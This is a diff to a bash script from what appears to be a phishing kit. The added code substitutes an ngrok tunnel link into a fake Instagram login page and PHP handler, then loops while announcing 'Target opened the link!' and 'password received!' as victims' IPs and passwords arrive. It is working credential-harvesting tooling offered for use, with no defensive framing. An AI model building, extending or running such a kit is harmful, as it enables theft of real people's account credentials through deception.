@@ -4,6 +4,42 @@
 
 trap 'printf "\n";stop' 2
 
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e "Log.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] password received!\e[0m\n"
+rm -rf Log.log
+fi
+sleep 0.5
+
+done 
+
+}
+payload_ngrok() {
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' instagram.html > index2.html
+sed 's+forwarding_link+'$link'+g' index.php > index.php
+
+
+}
+ngrok_server() {
+
+
 if [[ -e ngrok ]]; then
 echo ""
 else
@@ -46,3 +82,7 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+
+payload_ngrok
+checkfound
+}
